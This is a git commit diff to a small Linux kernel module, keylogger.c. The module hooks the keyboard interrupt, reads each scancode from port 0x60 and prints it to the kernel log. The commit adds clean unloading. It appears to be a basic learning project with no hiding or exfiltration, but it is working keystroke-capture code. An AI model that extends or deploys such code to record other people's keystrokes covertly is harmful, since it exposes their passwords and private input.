f3678cd24e378ff674fadaccccea4b0f5820ebaf
Ícaro Pires <icaropiresdf@gmail.com>
2017-11-25 01:58:44 -0200

    Add mechanism to allow keylogger to be removed without rebooting the system
    Signed-off-by: Ícaro Pires <icaropiresdf@gmail.com>

--- driver/keylogger.c
+++ driver/keylogger.c
@@ -4,33 +4,37 @@
 #include <linux/sched.h>
 #include <asm/io.h>
 
-/*
-   This function services keyboard interrupts.
- */
+int const keylogger = 0; // Just to use its addres as dev_id
+
+// This function services keyboard interrupts.
 irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs) {
 	static unsigned char scancode;
 
-	/*
-	   Read keyboard status
-	 */
-	scancode = inb(0x60);
+	scancode = inb(0x60); // Read keyboard status getting scancode from specific input port.
 
-	if ((scancode == 0x01) || (scancode == 0x81)) {
+	if((scancode == 0x01) || (scancode == 0x81)) {
 		printk ("\nYou pressed Esc !\n");
+	} else {
+		printk("Not mapped key!\n");
+		printk("Key was: %d\n\n", scancode);
 	}
 
 	return (irq_handler_t) IRQ_HANDLED;
 }
 
-/*
-   Initialize the module − register the IRQ handler
- */
-int init_module() {
-	/*
-	   Request IRQ 1, the keyboard IRQ, to go to our irq_handler IRQF_SHARED means we're willing to have other handlers on this IRQ.
-	 */
-	printk(KERN_ALERT "Hello, world\n");
-	return request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "test_keyboard_irq_handler", (void *)(irq_handler));
+void __exit irq_cleanup(void) {
+	printk(KERN_ALERT "Stopping keylogger...\n");
+	free_irq(1, (void *)(&keylogger));
 }
+
+// Initialize the module − register the IRQ handler
+int init_module() {
+	// Request IRQ 1, the keyboard IRQ, to go to our irq_handler IRQF_SHARED means we're willing to have other handlers on this IRQ.
+	printk(KERN_ALERT "Keylogger started");
+
+	return request_irq(1, (irq_handler_t) irq_handler, IRQF_SHARED, "keylogger", (void *)(&keylogger));
+}
+
+module_exit(irq_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
